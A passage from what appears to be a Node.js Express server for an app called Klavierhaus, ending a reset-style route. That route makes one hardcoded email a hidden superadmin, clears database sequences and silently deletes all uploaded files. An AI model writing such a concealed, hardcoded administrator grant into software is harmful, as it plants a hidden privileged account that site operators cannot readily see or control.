      db.prepare("UPDATE users SET status='Active', hidden_user=1, is_superadmin=1 WHERE lower(email)=lower(?)").run("simon.alex@klavierhaus.com");
    }
    if(exists("sqlite_sequence")){
      db.prepare("DELETE FROM sqlite_sequence WHERE name NOT IN ('users')").run();
    }
  });
  tx();
  try{
    if(fs.existsSync(UPLOAD_DIR)){
      for(const name of fs.readdirSync(UPLOAD_DIR)){
        const fp=path.join(UPLOAD_DIR,name);
        try{ fs.rmSync(fp,{recursive:true,force:true}); }catch(e){}
      }
    }
  }catch(e){}
  res.json({ok:true});
});

app.use((err,req,res,next)=>{
  if(err) return res.status(400).json({error:err.message || "Upload error"});
  next();
});
app.listen(PORT,()=>console.log(`Klavierhaus v6.3 running on http://localhost:${PORT}`));









